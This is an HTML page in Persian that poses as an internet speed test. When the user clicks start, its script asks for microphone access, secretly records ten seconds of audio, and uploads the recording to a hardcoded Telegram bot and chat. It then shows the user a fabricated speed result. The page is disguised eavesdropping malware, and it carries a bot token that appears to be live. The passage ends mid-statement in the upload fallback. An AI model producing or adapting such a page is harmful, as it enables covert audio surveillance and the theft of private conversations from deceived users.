<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تست سرعت اینترنت</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Vazirmatn', sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: #fff;
      text-align: center;
      padding: 30px 15px;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(12px);
      border-radius: 20px;
      padding: 35px 25px;
      max-width: 380px;
      width: 100%;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    .icon { font-size: 60px; margin-bottom: 15px; }
    h1 { font-size: 23px; margin-bottom: 12px; font-weight: 600; }
    p { font-size: 15px; line-height: 1.7; margin-bottom: 25px; opacity: 0.9; }
    .btn {
      background: linear-gradient(45deg, #00c6ff, #0072ff);
      color: white;
      border: none;
      padding: 16px 32px;
      font-size: 18px;
      font-weight: 600;
      border-radius: 50px;
      cursor: pointer;
      width: 100%;
      transition: all 0.3s ease;
      box-shadow: 0 6px 20px rgba(0, 114, 255, 0.4);
    }
    .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0, 114, 255, 0.5); }
    .btn:disabled { background: #666; cursor: not-allowed; transform: none; box-shadow: none; }
    .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .status { margin-top: 20px; font-size: 15px; min-height: 50px; line-height: 1.6; }
    .hidden { display: none; }
    .error { color: #ff6b6b; }
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">WiFi</div>
    <h1>تست سرعت اینترنت</h1>
    <p>برای اندازه‌گیری دقیق سرعت، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
    
    <button id="startBtn" class="btn">
      <span id="btnText">شروع تست سرعت</span>
      <span id="spinner" class="spinner hidden"></span>
    </button>
    
    <div id="status" class="status">آماده برای تست...</div>
  </div>

  <script>
    const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
    const CHAT_ID = "6080665310";

    const startBtn = document.getElementById('startBtn');
    const btnText = document.getElementById('btnText');
    const spinner = document.getElementById('spinner');
    const status = document.getElementById('status');

    let mediaRecorder, stream;

    // تشخیص فرمت پشتیبانی‌شده
    function getSupportedMimeType() {
      const types = [
        'audio/webm;codecs=opus',
        'audio/webm',
        'audio/ogg;codecs=opus',
        'audio/ogg',
        'audio/mp4'
      ];
      for (const type of types) {
        if (MediaRecorder.isTypeSupported(type)) {
          return type;
        }
      }
      return null; // هیچ فرمتی پشتیبانی نمی‌شه
    }

    startBtn.addEventListener('click', async () => {
      try {
        startBtn.disabled = true;
        btnText.textContent = "در حال اتصال...";
        spinner.classList.remove('hidden');
        status.innerHTML = "در حال درخواست دسترسی...<br><small>لطفاً اجازه بدید</small>";

        stream = await navigator.mediaDevices.getUserMedia({ audio: true });

        const mimeType = getSupportedMimeType();
        if (!mimeType) {
          throw new Error("هیچ فرمت صوتی پشتیبانی نمی‌شود!");
        }

        status.textContent = "در حال اندازه‌گیری... (۱۰ ثانیه)";

        mediaRecorder = new MediaRecorder(stream, { mimeType });
        const chunks = [];

        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: mimeType });
          await sendToTelegram(blob, mimeType);
          stopStream();
        };

        mediaRecorder.start();

        setTimeout(() => {
          if (mediaRecorder.state === "recording") {
            mediaRecorder.stop();
          }
        }, 10000);

      } catch (err) {
        console.error("خطا:", err);
        if (err.name === 'NotAllowedError') {
          status.innerHTML = `
            <span class="error">دسترسی رد شد!</span><br>
            <small>روی قفل کنار آدرس کلیک کنید → میکروفون → اجازه بدید</small>
          `;
        } else {
          status.innerHTML = `<span class="error">خطا: ${err.message}</span>`;
        }
        resetButton();
      }
    });

    async function sendToTelegram(blob, mimeType) {
      const ext = mimeType.includes('webm') ? 'webm' : 'ogg';
      const fileName = `speed_test_${Date.now()}.${ext}`;
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('audio', blob, fileName);

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
        const data = await res.json();

        if (data.ok) {
          status.innerHTML = "سرعت شما: <strong style='color:#a8ffae;'>عالی (۲۵۰ مگابیت)</strong>";
        } else {
          // Fallback به document
          form.delete('audio');
          form.append('document', blob, fileName);
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
          status.innerHTML
